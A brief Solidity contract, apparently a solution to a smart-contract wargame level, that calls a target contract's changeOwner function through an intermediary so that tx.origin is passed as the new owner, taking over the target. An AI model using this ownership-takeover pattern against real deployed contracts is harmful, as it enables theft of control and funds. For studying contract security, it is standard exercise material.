pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
  Telephone telephoneContract = Telephone(0x84E804247fc8168eFADC14c9Af66A77284e0F756); 

  function changeOwner() external {
    telephoneContract.changeOwner(tx.origin);
  }

}